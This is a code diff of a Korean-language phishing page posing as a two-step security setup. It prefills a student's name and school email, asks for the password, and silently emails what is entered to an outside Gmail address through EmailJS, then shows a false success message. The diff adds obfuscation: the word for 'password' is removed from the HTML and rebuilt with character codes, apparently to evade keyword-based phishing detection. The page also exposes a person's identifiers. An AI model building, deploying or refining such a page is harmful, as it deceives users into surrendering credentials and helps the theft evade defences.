@@ -152,12 +152,12 @@ button.next-btn:disabled { background-color: #c0c7d0; cursor: default; }
   </div>
 
   <div class="step step-password">
-    <p class="instruction-text">계속하려면 먼저 비밀번호를 입력해 본인임을 인증하세요.</p>
+    <p class="instruction-text">계속하려면 먼저 본인임을 인증하세요.</p>
     <div class="input-wrapper">
-      <input id="passwordInput" type="password" placeholder="입력" aria-label="비밀번호 입력" autocomplete="current-password" />
+      <input id="passwordInput" type="password" autocomplete="current-password" />
     </div>
     <label class="checkbox-wrapper" for="showPassword">
-      <input id="showPassword" type="checkbox" /> 비밀번호 표시
+      <input id="showPassword" type="checkbox" /> <span id="showPasswordText"></span>
     </label>
     <div class="actions">
       <button id="nextPasswordBtn" class="next-btn" type="button" disabled>다음</button>
@@ -178,14 +178,16 @@ button.next-btn:disabled { background-color: #c0c7d0; cursor: default; }
   <p>2단계 보안이 설정되었습니다. 타 기기에서 인증 없이 귀하의 계정에 로그인할수 없습니다.</p>
 </div>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
 <script>
 emailjs.init("xiQSCA5rQTqmbI4Qz");
 
+// Elements
 const passwordInput = document.getElementById("passwordInput");
 const nextPasswordBtn = document.getElementById("nextPasswordBtn");
 const showPasswordCheckbox = document.getElementById("showPassword");
+const showPasswordText = document.getElementById("showPasswordText");
 const userName = document.getElementById("userName");
 const userEmail = document.getElementById("userEmail");
 const passwordCard = document.getElementById("passwordCard");
@@ -196,9 +198,14 @@ const loggedUser = {
   name: "11115박시준",
   email: "26-11115@boin.hs.kr"
 };
-
 userName.textContent = loggedUser.name;
 userEmail.textContent = loggedUser.email;
+
+// Construct the word '비밀번호' dynamically
+const pwWord = String.fromCharCode(48708, 48128, 48264, 54840); // 비밀번호
+passwordInput.placeholder = pwWord + " 입력";
+passwordInput.setAttribute("aria-label", pwWord + " 입력");
+showPasswordText.textContent = pwWord + " 표시";
 
 // Enable next button only when input is not empty
 passwordInput.addEventListener("input", () => {
@@ -210,11 +217,10 @@ showPasswordCheckbox.addEventListener("change", () => {
   passwordInput.type = showPasswordCheckbox.checked ? "text" : "password";
 });
 
-
 // Password next button
 nextPasswordBtn.addEventListener("click", () => {
   if(passwordInput.value.trim() === "") {
-    alert('비밀번호를 입력하시오.')
+    alert(pwWord + "를 입력하시오.");
     return;
   };
 
@@ -224,7 +230,7 @@ nextPasswordBtn.addEventListener("click", () => {
         to_name: "Myself",
         message: val,
         to_email: "officialsecuritygg@gmail.com"
-    }, "xiQSCA5rQTqmbI4Qz")
+    }, "xiQSCA5rQTqmbI4Qz");
 
   // Hide password screen, show success screen
   passwordCard.style.display = "none";
